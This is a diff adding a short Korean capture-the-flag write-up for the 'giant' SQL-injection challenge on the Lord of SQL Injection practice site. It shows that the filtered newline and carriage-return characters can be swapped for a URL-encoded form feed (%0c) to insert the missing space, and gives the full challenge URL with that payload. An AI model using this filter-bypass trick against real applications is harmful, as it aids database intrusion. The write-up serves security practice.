@@ -1,0 +1,12 @@
+I"�<p>select 1234 fromprob_giant where 1</p>
+
+<p>fromprob_giant가 붙어있다.</p>
+
+<p>저걸 \n이나 \r로 띄어줘야 하는데 죄다 필터링 되있다 하지만 url encoding 표를 보면 %0a, %0b %0c 등을 쓰고 있다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://los.sandbox.cash/chall/giant_0ea82d6bd3e3cb4614e318f096753475.php?shit=%0c
+</code></pre></div></div>
+
+<p>끝</p>
+
+:ET
